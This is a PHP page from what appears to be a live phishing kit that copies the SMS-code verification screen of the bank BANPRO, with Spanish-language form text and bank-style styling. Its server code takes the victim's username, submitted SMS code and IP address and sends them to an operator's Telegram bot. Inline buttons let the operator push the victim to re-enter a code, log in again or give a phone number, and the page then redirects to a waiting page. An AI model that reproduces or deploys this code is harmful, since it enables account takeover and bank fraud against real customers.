<?php
session_start();
include("settings.php"); // Contiene $token y $chat_id

$usuario = $_SESSION['usuario'] ?? null;

if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
    $codigo = htmlspecialchars($_POST['ips1'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "📲 VALIDACIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ SMS Error', 'callback_data' => "SMSERROR|$usuario"],
                    ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"],
                    ['text' => '📱 Teléfono', 'callback_data' => "NUMERO|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validación - Error</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<div id="main-cnt" style="overflow: hidden; min-height: 100vh; position: relative;">
    <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="frmc" style="display: inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
            <form method="post" action="" id="f1"
                  style="display: inline-block; width: 420px; height: 660px; border-radius: 10px; background-image: url(2.svg); position: relative;">
                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                <input minlength="6" maxlength="8" id="i1" name="ips1" placeholder="Código" type="text" inputmode="numeric" required
                       style="display: block; position: relative; color: #333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                
                <input type="submit" value="Continuar"
                       style="display: block; position: relative; font-size: 16px; color: #fff; background: rgb(0, 105, 60); border: none; top: 224px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
            </form>
        </div>
        <div id="bnncont" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }

    @media screen and (max-width: 1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #ctn {
            border-radius: 6px !important;
        }
        #main-cnt {
            text-align: center !important;
            padding-top: 30px;
        }
        #frmc {
            width: 100% !important;
        }
        #bnncont {
            display: none !important;
        }
    }
</style>
</body>
</html>
